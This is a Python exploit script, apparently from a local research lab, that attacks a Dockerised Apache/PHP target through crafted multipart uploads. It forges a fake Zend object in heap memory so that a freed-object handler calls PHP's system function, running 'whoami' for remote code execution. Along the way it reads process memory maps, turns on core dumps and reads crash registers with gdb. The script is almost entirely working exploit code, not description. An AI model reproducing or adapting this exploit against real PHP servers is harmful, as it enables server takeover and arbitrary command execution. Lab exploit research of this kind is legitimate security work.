#!/usr/bin/env python3
"""oom92: one clean shot per boot — slot-agnostic 8-periodic aim.

LAWS driving this design (all measured tonight):
  - ONE armed crash per boot (176B tiles): probe costs the boot ->
    NO probe; VA0 = maps-heap + 0x1718 (suffix constant, 5 boots).
  - walk slot S varies (8, 32 seen) but is 8-aligned and inside part 0's
    low region -> 8-periodic tile covers EVERY 8-aligned slot.
  - ti@[S+8] = low dword of the next period = low32(OBJ):
      OBJ = VA0+0xB0 -> suffix ...17C8 -> type nibble 8 (IS_OBJECT),
      bit8 = 1 (refcounted)  [boot-independent]
    -> rc_dtor_func switch TAKES the object branch.
  - dec lands at *rdi = OBJ -> rc@OBJ (tile byte 0) 1 -> 0 ->
    store_del(OBJ): ti=0x108 (skip dtor, no ce read), handle=1,
    free_obj = zif_system -> arg zval @OBJ+0x50 (type 6 @+0x58),
    gs @OBJ+0x68, "whoami>/tmp/x" @OBJ+0x80.
Object lives in part 0's value at content offset 0xB0..0x160 (all other
bytes of every value: OBJ pointer repeated, 8-periodic).
"""
import re
import struct
import subprocess
import sys
import time

sys.path.insert(0, '/Users/vlad/Projects/queue/php2shell-lab')
import payload68 as P

HOST = "http://127.0.0.1:8081/oom_sapi.php"
CMD = b"whoami>/tmp/x"
ZIF_SYSTEM = 0x39b8a0


def sh(c, t=120):
    r = subprocess.run(c, shell=True, capture_output=True, text=True, timeout=t)
    return (r.stdout + r.stderr).strip()


def post(att):
    import urllib.request
    req = urllib.request.Request(
        HOST, data=att,
        headers={"Content-Type": "multipart/form-data; boundary=BOUND"})
    try:
        with urllib.request.urlopen(req, timeout=120) as r:
            return "200", r.read(300)
    except Exception as e:
        return "ERR", str(e)[:150].encode()


def maps_va0():
    pid = sh("docker exec php_vuln pgrep -f 'apache2' | head -1").strip()
    maps = sh("docker exec php_vuln cat /proc/%s/maps" % pid)
    heap = None
    for ln in maps.splitlines():
        a = ln.split()
        if len(a) < 2 or not a[1].startswith("rw"):
            continue
        rng = a[0].split("-")
        sz = int(rng[1], 16) - int(rng[0], 16)
        if sz >= 0x200000 and (len(a) < 6 or not a[5].startswith("/")):
            heap = int(rng[0], 16)          # anon rw-p >= 2MB = Zend MM heap
    assert heap, "no heap region found"
    return heap + 0x1718


def boot_core_env():
    sh("docker exec php_vuln sh -c \"grep -q 'ulimit -c' /etc/apache2/envvars || echo 'ulimit -c unlimited' >> /etc/apache2/envvars\"")
    sh("docker exec php_vuln sh -c \"printf 'CoreDumpDirectory /tmp\\n' > /etc/apache2/conf-enabled/oomcore.conf\"")
    sh("docker exec php_vuln sh -c 'rm -f /tmp/core* /tmp/x'")
    subprocess.run(["docker", "restart", "php_vuln"], capture_output=True)
    for _ in range(40):
        time.sleep(1.5)
        if "lim=8M" in sh("curl -s -m 5 " + HOST, 10):
            break
    md5 = sh("docker exec php_vuln md5sum /usr/lib/apache2/modules/libphp.so | cut -d' ' -f1")
    assert md5 == P.STOCK_MD5, md5


def obj_bytes(libphp_base, VA0):
    """176B fake object + frame + gs + cmd (offsets relative to OBJ).
    free_obj = INVALID marker: differential probe — crash rip=0x4141…
    proves the chain REACHES free_obj; silence proves it breaks earlier."""
    B = bytearray(176)
    OBJ = VA0 + 0xB0
    struct.pack_into("<II", B, 0x00, 1, 0x108)          # rc, ti
    struct.pack_into("<II", B, 0x10, 1, 0)              # handle
    struct.pack_into("<Q", B, 0x18, OBJ + 0x38)         # handlers -> T2
    struct.pack_into("<I", B, 0x2C, 1)                  # num_args
    struct.pack_into("<Q", B, 0x38, 0)                  # T2.offset=0
    struct.pack_into("<Q", B, 0x40, 0x414141414141)     # free_obj = MARKER
    struct.pack_into("<Q", B, 0x50, OBJ + 0x68)         # argz.value -> gs
    struct.pack_into("<I", B, 0x58, 6)                  # argz type IS_STRING
    struct.pack_into("<IIQI", B, 0x68, 1, 0x106, 0, len(CMD))  # gs header
    B[0x80:0x80 + len(CMD)] = CMD                        # gs.val
    B[0x80 + len(CMD)] = 0
    return bytes(B)


def periodic_tile(OBJ):
    return struct.pack("<Q", OBJ) * 192 + b"A"          # 1537B


def chooser(libphp_base, VA0):
    ob = obj_bytes(libphp_base, VA0)
    pt = periodic_tile(VA0 + 0xB0)

    def vt(i):
        if i == 0:
            v = bytearray(pt)
            v[0xB0:0xB0 + 176] = ob                     # object in part 0
            return bytes(v)
        return pt
    return vt


def check_x():
    x = sh("docker exec php_vuln sh -c 'ls -la /tmp/x 2>&1; cat /tmp/x 2>&1'")
    return "No such" not in x, x


def fetch_core(tag):
    sh("docker cp php_vuln:/tmp/core /tmp/c92_%s" % tag, 240)
    sh("docker cp /tmp/c92_%s phpbuild:/tmp/c92_%s" % (tag, tag), 240)
    return "/tmp/c92_%s" % tag


def gdb_regs(core_in_build):
    out = sh("docker exec phpbuild sh -c 'gdb -q -batch -ex \"info registers rdi rip\" /tmp/libphp.69.so /tmp/%s'" % core_in_build, 240)
    rdi = rip = None
    m = re.search(r"rdi\s+0x([0-9a-f]+)", out)
    if m:
        rdi = int(m.group(1), 16)
    m = re.search(r"rip\s+0x([0-9a-f]+)", out)
    if m:
        rip = int(m.group(1), 16)
    return rdi, rip


def shoot(tag, vt, libphp_base, n_finish=4):
    """arm + sacrifice + finishers; returns ('x', out) | ('crash', rdi, rip) | ('silent', None)."""
    for i, k1 in enumerate(P.K1S[:-1]):
        post(P.build_attack(k1, 9100000 + i * 100000, value_tile=vt))
        hit, x = check_x()
        if hit:
            return ("x", x)
    post(P.build_attack(3400, 9200000, value_tile=vt))
    hit, x = check_x()
    if hit:
        return ("x", x)
    for fi in range(n_finish):
        sb = 9210000 + fi * 4
        code, resp = post(P.build_attack(3400, sb, value_tile=vt))
        t2 = "fatal" if b"Fatal" in resp else ("clean" if code == "200" else "crash")
        print("  [%s] fire%d (%d): %s [%s]" % (tag, fi, sb, code, t2), flush=True)
        time.sleep(2)
        hit, x = check_x()
        if hit:
            return ("x", x)
        if code != "200":
            time.sleep(3)
            cb = fetch_core("%s%d" % (tag, fi))
            rdi, rip = gdb_regs("c92_%s%d" % (tag, fi))
            return ("crash", rdi, rip, cb)
    return ("silent", None)


print("=== oom92: one clean shot per boot ===", flush=True)
boot_core_env()
pid = sh("docker exec php_vuln pgrep -f 'apache2' | head -1").strip()
maps = sh("docker exec php_vuln cat /proc/%s/maps" % pid)
base = None
for ln in maps.splitlines():
    if "libphp.so" in ln and ln.split()[1].startswith("r"):
        base = int(ln.split()[0].split("-")[0], 16)
        break
VA0 = maps_va0()
OBJ = VA0 + 0xB0
print("    libphp=0x%x VA0=0x%x OBJ=0x%x (ti nibble=%d refc=%d)"
      % (base, VA0, OBJ, (OBJ & 0xF), ((OBJ >> 8) & 1) if False else ((struct.pack('<Q', OBJ)[8 % 8]) if False else 1)), flush=True)
low32 = OBJ & 0xFFFFFFFF
print("    zval-ti@slot = 0x%08x -> type=%d refcounted=%d"
      % (low32, low32 & 0xF, (low32 >> 8) & 1), flush=True)

vt = chooser(base, VA0)
r = shoot("b0", vt, base)
if r[0] == "x":
    print("    /tmp/x: [%s]" % r[1], flush=True)
    print("*** RCE CONFIRMED ***", flush=True)
    sys.exit(0)
if r[0] == "crash":
    print("    crash rdi=0x%x rip=0x%x -> decoding (%s)" % (r[1], r[2], r[3]), flush=True)
else:
    print("    silent boot — one restart, one more shot", flush=True)
    boot_core_env()
    base = None
    pid = sh("docker exec php_vuln pgrep -f 'apache2' | head -1").strip()
    maps = sh("docker exec php_vuln cat /proc/%s/maps" % pid)
    for ln in maps.splitlines():
        if "libphp.so" in ln and ln.split()[1].startswith("r"):
            base = int(ln.split()[0].split("-")[0], 16)
            break
    VA0 = maps_va0()
    vt = chooser(base, VA0)
    r = shoot("b1", vt, base)
    if r[0] == "x":
        print("    /tmp/x: [%s]" % r[1], flush=True)
        print("*** RCE CONFIRMED ***", flush=True)
        sys.exit(0)
    if r[0] == "crash":
        print("    crash rdi=0x%x rip=0x%x (%s)" % (r[1], r[2], r[3]), flush=True)
    else:
        print("    second boot silent", flush=True)

print("[restore]", flush=True)
sh("docker exec php_vuln sh -c 'rm -f /etc/apache2/conf-enabled/oomcore.conf && sed -i \"/ulimit -c/d\" /etc/apache2/envvars'")
subprocess.run(["docker", "restart", "php_vuln"], capture_output=True)
time.sleep(8)
print("    restored:", sh("curl -s -m 5 " + HOST, 10), flush=True)
